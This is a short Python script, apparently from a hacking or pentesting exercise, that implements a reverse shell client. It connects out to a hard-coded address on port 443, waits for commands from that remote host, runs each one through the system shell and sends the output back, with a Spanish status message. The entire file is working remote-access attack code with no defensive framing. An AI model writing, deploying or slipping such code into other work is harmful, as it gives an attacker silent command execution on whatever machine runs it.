import socket
import subprocess


def run_command(command):
    try:
        command_output = subprocess.check_output(command, shell=True)
        return command_output.decode("cp850")
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    IP = "192.168.68.135"
    PORT = 443
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP,PORT))
    print("[*] Conectado al servidor")
    while True:
        command = client_socket.recv(2048).decode().strip()
        command_output = run_command(command)
        client_socket.send(b"\n" + command_output.encode() + b"\n\n")
    client_socket.close()
